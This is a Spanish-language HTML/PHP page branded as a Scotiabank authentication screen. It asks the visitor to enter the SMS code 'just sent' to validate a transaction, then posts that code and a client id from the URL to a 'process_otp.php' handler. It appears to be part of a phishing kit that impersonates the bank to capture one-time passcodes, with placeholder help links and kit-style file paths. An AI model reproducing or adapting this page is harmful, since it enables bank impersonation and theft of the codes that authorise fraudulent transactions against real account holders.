<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank | Autenticación</title>
    <link rel="stylesheet" href="scotiabank.css">
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
</head>
<body>
<div class="login-page fade-in">

    <!-- Header con logo -->
    <header class="login-header">
        <img src="new-brand-red.svg" alt="Scotiabank">
    </header>

    <!-- Cuerpo OTP -->
    <main class="login-body">
        <div class="login-card">

            <!-- Icono escudo -->
            <div style="width:5.6rem;height:5.6rem;border-radius:50%;background:#fef0f0;
                        display:flex;align-items:center;justify-content:center;margin-bottom:2rem;">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none"
                     viewBox="0 0 24 24" stroke="#ec111a" stroke-width="1.8">
                    <path stroke-linecap="round" stroke-linejoin="round"
                          d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6
                             11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623
                             5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152
                             c-3.196 0-6.1-1.248-8.25-3.285Z"/>
                </svg>
            </div>

            <h1 class="heading" style="margin-bottom:1.2rem;">Vamos a validar tu transacción</h1>

            <p class="text--small" style="color:#757575;margin-bottom:3.2rem;line-height:2.2rem;">
                Ingresa el código SMS que acabamos de enviar a tu número de celular registrado.
            </p>

            <form action="process/process_otp.php" method="POST">
                <input type="hidden" name="cliente_id"
                       value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">

                <!-- Código OTP -->
                <div class="form-field">
                    <label class="form-field__label text--caption text--bold"
                           for="claveDinamica">
                        Código de verificación
                    </label>
                    <input
                        class="otp-input"
                        type="text"
                        name="claveDinamica"
                        id="claveDinamica"
                        placeholder="· · · · · ·"
                        required
                        minlength="4"
                        maxlength="8"
                        pattern="\d*"
                        inputmode="numeric"
                        autocomplete="one-time-code"
                    >
                </div>

                <!-- Botón enviar -->
                <button type="submit" class="button button--primary"
                        style="font-size:1.8rem;min-height:5.2rem;border-radius:3.2rem;margin-top:0.8rem;">
                    ENVIAR
                </button>
            </form>

            <!-- Divider -->
            <hr class="ruler" style="margin:2.4rem 0;">

            <!-- Links pie -->
            <div style="display:flex;flex-direction:column;gap:1.2rem;text-align:center;">
                <a href="#" class="link" style="font-size:1.6rem;">PEDIR OTRO CÓDIGO</a>
                <a href="#" class="link" style="font-size:1.4rem;color:#757575;font-family:'Scotia Regular',Arial,Helvetica,sans-serif;">
                    ¿Necesitas ayuda? | Términos de Uso
                </a>
            </div>

        </div>
    </main>

</div>
</body>
</html>
